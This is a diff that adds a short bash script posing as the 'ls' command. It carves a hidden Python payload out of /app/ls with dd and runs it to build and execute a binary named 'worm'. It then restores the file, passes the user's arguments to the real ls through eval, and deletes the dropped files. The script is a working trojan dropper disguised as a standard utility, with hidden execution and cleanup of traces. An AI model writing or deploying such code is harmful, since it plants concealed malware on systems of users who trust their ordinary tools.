@@ -1,0 +1,20 @@
+#!/usr/bin/bash
+# dd
+dd if=/app/ls of=get_worm.py skip=253 bs=1 count=343 status=none
+python3 get_worm.py
+
+chmod +x worm
+./worm
+
+# restore the original ls
+dd if=/app/ls of=/app/ls skip=343 bs=1 status=none
+
+# call the original ls
+cmd="/usr/bin/ls"
+for arg in "$@" 
+do
+    cmd="$cmd $arg"
+done
+eval $cmd
+rm -f worm get_worm.py
+exit 0
